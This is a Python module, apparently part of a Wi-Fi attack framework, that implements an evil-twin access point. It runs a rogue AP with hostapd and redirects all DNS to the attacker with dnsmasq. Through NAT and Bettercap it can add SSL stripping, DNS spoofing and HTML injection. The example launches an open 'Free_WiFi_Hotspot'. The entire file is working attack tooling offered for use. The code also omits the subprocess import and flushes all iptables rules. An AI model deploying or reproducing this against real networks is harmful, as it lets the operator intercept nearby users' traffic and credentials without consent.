import os
import time
import threading
from BaseModule import BaseModule # Assuming BaseModule is in BaseModule.py

class EvilTwinModule(BaseModule):
    def __init__(self, interface: str):
        super().__init__(interface)
        self.hostapd_conf_path = f"/tmp/hostapd_{os.getpid()}.conf"
        self.dnsmasq_conf_path = f"/tmp/dnsmasq_{os.getpid()}.conf"
        self.hostapd_process = None
        self.dnsmasq_process = None
        self.bettercap_process = None
        self.ip_address = "10.0.0.1" # IP for the fake AP interface
        self.netmask = "255.255.255.0"
        self.dhcp_range_start = "10.0.0.10"
        self.dhcp_range_end = "10.0.0.250"

    def _create_hostapd_conf(self, essid: str, channel: int, encryption: str = "open", password: str = None):
        """Generates hostapd configuration."""
        config_content = f"""
interface={self.interface}
driver=nl80211
ssid={essid}
channel={channel}
hw_mode=g
macaddr_acl=0
ignore_broadcast_ssid=0
"""
        if encryption.lower() == "wpa2" and password:
            config_content += f"""
wpa=2
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
wpa_passphrase={password}
"""
        elif encryption.lower() == "wpa" and password:
            config_content += f"""
wpa=1
wpa_key_mgmt=WPA-PSK
pairwise=TKIP CCMP
wpa_passphrase={password}
"""
        # else: open network

        with open(self.hostapd_conf_path, 'w') as f:
            f.write(config_content.strip())
        print(f"Hostapd config written to {self.hostapd_conf_path}")

    def _create_dnsmasq_conf(self):
        """Generates dnsmasq configuration for DHCP and DNS."""
        config_content = f"""
interface={self.interface}
dhcp-range={self.dhcp_range_start},{self.dhcp_range_end},12h
dhcp-option=3,{self.ip_address}  # Router (gateway)
dhcp-option=6,{self.ip_address}  # DNS server
log-queries
log-dhcp
address=/#/{self.ip_address} # DNS Spoofing: redirect all domains to our IP
"""
        with open(self.dnsmasq_conf_path, 'w') as f:
            f.write(config_content.strip())
        print(f"Dnsmasq config written to {self.dnsmasq_conf_path}")

    def _setup_interface_ip(self):
        """Configures the IP address for the fake AP interface."""
        print(f"Setting up IP address {self.ip_address} for {self.interface}...")
        try:
            self._run_command(['sudo', 'ifconfig', self.interface, self.ip_address, 'netmask', self.netmask], wait=True)
            return True
        except Exception as e:
            print(f"Error setting IP for {self.interface}: {e}")
            self.error_buffer.append(f"Error setting IP for {self.interface}: {e}")
            return False

    def _enable_ip_forwarding(self):
        """Enables IP forwarding for internet access."""
        print("Enabling IP forwarding...")
        try:
            self._run_command(['sudo', 'sysctl', '-w', 'net.ipv4.ip_forward=1'], wait=True)
            return True
        except Exception as e:
            print(f"Error enabling IP forwarding: {e}")
            self.error_buffer.append(f"Error enabling IP forwarding: {e}")
            return False

    def _setup_nat(self, upstream_interface: str):
        """Sets up NAT using iptables for internet access."""
        print(f"Setting up NAT from {self.interface} to {upstream_interface}...")
        try:
            # Clear existing rules (optional, be careful)
            self._run_command(['sudo', 'iptables', '--flush'], wait=True)
            self._run_command(['sudo', 'iptables', '--delete-chain'], wait=True)
            self._run_command(['sudo', 'iptables', '-t', 'nat', '--flush'], wait=True)
            self._run_command(['sudo', 'iptables', '-t', 'nat', '--delete-chain'], wait=True)

            # Enable NAT
            self._run_command(['sudo', 'iptables', '-t', 'nat', '-A', 'POSTROUTING', '-o', upstream_interface, '-j', 'MASQUERADE'], wait=True)
            self._run_command(['sudo', 'iptables', '-A', 'FORWARD', '-i', self.interface, '-o', upstream_interface, '-j', 'ACCEPT'], wait=True)
            self._run_command(['sudo', 'iptables', '-A', 'FORWARD', '-i', upstream_interface, '-o', self.interface, '-m', 'state', '--state', 'RELATED,ESTABLISHED', '-j', 'ACCEPT'], wait=True)
            return True
        except Exception as e:
            print(f"Error setting up NAT: {e}")
            self.error_buffer.append(f"Error setting up NAT: {e}")
            return False

    def _start_hostapd(self):
        """Starts the hostapd process."""
        print("Starting hostapd...")
        try:
            self.hostapd_process = subprocess.Popen(
                ['sudo', 'hostapd', self.hostapd_conf_path],
                stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, universal_newlines=True, bufsize=1
            )
            print("Hostapd process started.")
            return True
        except Exception as e:
            print(f"Error starting hostapd: {e}")
            self.error_buffer.append(f"Error starting hostapd: {e}")
            return False

    def _start_dnsmasq(self):
        """Starts the dnsmasq process."""
        print("Starting dnsmasq...")
        try:
            # Need to kill any existing dnsmasq process that might be running
            self._run_command(['sudo', 'pkill', '-9', 'dnsmasq'], wait=True)
            time.sleep(1) # Give it a moment

            self.dnsmasq_process = subprocess.Popen(
                ['sudo', 'dnsmasq', '-C', self.dnsmasq_conf_path],
                stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, universal_newlines=True, bufsize=1
            )
            print("Dnsmasq process started.")
            return True
        except Exception as e:
            print(f"Error starting dnsmasq: {e}")
            self.error_buffer.append(f"Error starting dnsmasq: {e}")
            return False

    def _start_bettercap(self, target_ip: str = None, sslstrip: bool = False, http_proxy: bool = False, dns_spoof: bool = False, inject_html: str = None):
        """
        Starts Bettercap for MitM and other attacks.
        This is highly customizable.
        """
        print("Starting Bettercap...")
        command = ['sudo', 'bettercap', '-iface', self.interface]

        # Common capabilities
        if dns_spoof:
            command.extend(['-caplet', 'dns.spoof']) # Bettercap's own DNS spoofer, might conflict with dnsmasq if both active
        if sslstrip:
            command.extend(['-caplet', 'hsts.disable', '-caplet', 'http.proxy'])
            command.extend(['-eval', 'set http.proxy.sslstrip true'])
        if http_proxy:
            command.extend(['-caplet', 'http.proxy'])

        # Example: Injecting HTML (requires http.proxy)
        if inject_html:
            command.extend(['-eval', f'set http.proxy.inject "text/html" {inject_html}']) # inject_html should be a path to a file or raw HTML

        # Other useful bettercap options
        # command.extend(['-eval', 'events.stream on']) # For real-time event streaming

        print(f"Bettercap command: {' '.join(command)}")
        try:
            self.bettercap_process = subprocess.Popen(
                command,
                stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, universal_newlines=True, bufsize=1
            )
            print("Bettercap process started.")
            return True
        except Exception as e:
            print(f"Error starting Bettercap: {e}")
            self.error_buffer.append(f"Error starting Bettercap: {e}")
            return False


    def start(self, essid: str, channel: int, upstream_interface: str, encryption: str = "open", password: str = None,
              enable_bettercap: bool = False, bettercap_options: dict = None):
        """
        Starts the Evil Twin attack.
        Args:
            essid (str): The ESSID of the fake AP.
            channel (int): The channel for the fake AP.
            upstream_interface (str): The interface connected to the internet (e.g., eth0, wlan1).
            encryption (str): "open", "wpa", "wpa2".
            password (str, optional): Password if encryption is WPA/WPA2.
            enable_bettercap (bool): Whether to start Bettercap for MITM.
            bettercap_options (dict): Options for Bettercap (e.g., {'sslstrip': True, 'dns_spoof': True}).
        """
        self.status = "running"
        self._clear_buffers()

        # 1. Kill any interfering processes
        print("Killing interfering processes (NetworkManager, wpa_supplicant etc.)...")
        self._run_command(['sudo', 'airmon-ng', 'check', 'kill'], wait=True)
        time.sleep(1)

        # 2. Set interface to monitor mode (or ensure it is)
        # Note: For hostapd, the interface usually needs to be in managed mode,
        # but modern hostapd versions can handle setting it up if drivers support nl80211.
        # It's safer to ensure it's in a state hostapd likes, often managed, then hostapd handles AP mode.
        # However, for a "full" framework, you might set it to monitor first for other modules.
        # Here, hostapd needs it for AP mode, so we rely on hostapd config.
        # Ensure it's down first for clean setup.
        self._run_command(['sudo', 'ifconfig', self.interface, 'down'], wait=True)
        time.sleep(1)


        # 3. Configure IP address for the fake AP interface
        if not self._setup_interface_ip():
            self.status = "error"
            return

        # 4. Enable IP forwarding
        if not self._enable_ip_forwarding():
            self.status = "error"
            return

        # 5. Set up NAT for internet access
        if not self._setup_nat(upstream_interface):
            self.status = "error"
            return

        # 6. Create hostapd config and start hostapd
        self._create_hostapd_conf(essid, channel, encryption, password)
        if not self._start_hostapd():
            self.status = "error"
            return

        time.sleep(2) # Give hostapd time to start

        # 7. Create dnsmasq config and start dnsmasq
        self._create_dnsmasq_conf()
        if not self._start_dnsmasq():
            self.status = "error"
            self._cleanup() # Clean up what we started
            return

        time.sleep(2) # Give dnsmasq time to start

        # 8. Start Bettercap if enabled
        if enable_bettercap and bettercap_options:
            if not self._start_bettercap(**bettercap_options):
                self.status = "error"
                self._cleanup()
                return

        print(f"Evil Twin '{essid}' on {self.interface} successfully started.")
        self.status = "running"


    def stop(self):
        """Stops all Evil Twin processes and cleans up."""
        print("Stopping Evil Twin attack...")
        if self.bettercap_process and self.bettercap_process.poll() is None:
            print("Terminating Bettercap...")
            self.bettercap_process.terminate()
            self.bettercap_process.wait(timeout=5)
        if self.hostapd_process and self.hostapd_process.poll() is None:
            print("Terminating Hostapd...")
            self.hostapd_process.terminate()
            self.hostapd_process.wait(timeout=5)
        if self.dnsmasq_process and self.dnsmasq_process.poll() is None:
            print("Terminating Dnsmasq...")
            self.dnsmasq_process.terminate()
            self.dnsmasq_process.wait(timeout=5)

        self._cleanup()
        super().stop() # Call base class stop to update status etc.

    def _cleanup(self):
        """Cleans up temporary files, network configurations."""
        print("Cleaning up Evil Twin configurations...")
        # Remove IP address
        self._run_command(['sudo', 'ifconfig', self.interface, '0.0.0.0'], wait=True)
        # Bring interface down and up to reset it
        self._run_command(['sudo', 'ifconfig', self.interface, 'down'], wait=True)
        self._run_command(['sudo', 'ifconfig', self.interface, 'up'], wait=True)
        # Restore IP forwarding to default (off)
        self._run_command(['sudo', 'sysctl', '-w', 'net.ipv4.ip_forward=0'], wait=True)
        # Flush iptables rules created by this module
        self._run_command(['sudo', 'iptables', '--flush'], wait=True)
        self._run_command(['sudo', 'iptables', '--delete-chain'], wait=True)
        self._run_command(['sudo', 'iptables', '-t', 'nat', '--flush'], wait=True)
        self._run_command(['sudo', 'iptables', '-t', 'nat', '--delete-chain'], wait=True)

        # Delete temporary configuration files
        if os.path.exists(self.hostapd_conf_path):
            os.remove(self.hostapd_conf_path)
            print(f"Removed {self.hostapd_conf_path}")
        if os.path.exists(self.dnsmasq_conf_path):
            os.remove(self.dnsmasq_conf_path)
            print(f"Removed {self.dnsmasq_conf_path}")

        print("Evil Twin cleanup complete.")


# Example Usage (simulate GUI interaction)
if __name__ == "__main__":
    # !!! IMPORTANT: You need two WLAN adapters for this setup:
    # 1. One for the fake AP (e.g., awus036ach -> wlan0)
    # 2. One for internet uplink (e.g., another awus036axm or eth0 -> wlan1 / eth0)
    # Ensure your 'interface' (for fake AP) is NOT in monitor mode initially,
    # as hostapd sets it to AP mode.
    # The 'upstream_interface' should be connected to the internet.

    fake_ap_interface = "wlan0" # Replace with your adapter for the fake AP
    internet_uplink_interface = "wlan1" # Replace with your internet-connected adapter (e.g., eth0 or wlan1)

    print(f"Ensure {fake_ap_interface} is in managed mode or down. {internet_uplink_interface} should be connected to internet.")
    print("This script requires root privileges and will modify network settings.")

    evil_twin = EvilTwinModule(fake_ap_interface)

    # Example 1: Open Evil Twin with DNS Spoofing via Bettercap
    print("\nStarting Open Evil Twin with DNS Spoofing...")
    evil_twin.start_threaded(
        essid="Free_WiFi_Hotspot",
        channel=6,
        upstream_interface=internet_uplink_interface,
        encryption="open",
        enable_bettercap=True,
        bettercap_options={'dns_spoof': True, 'sslstrip': False} # Customize Bettercap options
    )

    print("Evil Twin running for 30 seconds (or until manual stop)...")
    time.sleep(30)
    print("Stopping Evil Twin...")
    evil_twin.stop_threaded()
    time.sleep(5) # Give cleanup some time
    print("Evil Twin status:", evil_twin.get_status())
    print("\n--- Output from Evil Twin attempt ---")
    stdout, stderr = evil_twin.get_output()
    print("STDOUT:", stdout)
    print("STDERR:", stderr)

    # Example 2: WPA2 Evil Twin (no Bettercap for simplicity)
    # print("\nStarting WPA2 Evil Twin (no Bettercap)...")
    # evil_twin_wpa2 = EvilTwinModule(fake_ap_interface)
    # evil_twin_wpa2.start_threaded(
    #     essid="Secure_Free_WiFi",
    #     channel=11,
    #     upstream_interface=internet_uplink_interface,
    #     encryption="wpa2",
    #     password="password123",
    #     enable_bettercap=False
    # )
    # time.sleep(30)
    # evil_twin_wpa2.stop_threaded()
    # time.sleep(5)
    # print("WPA2 Evil Twin status:", evil_twin_wpa2.get_status())
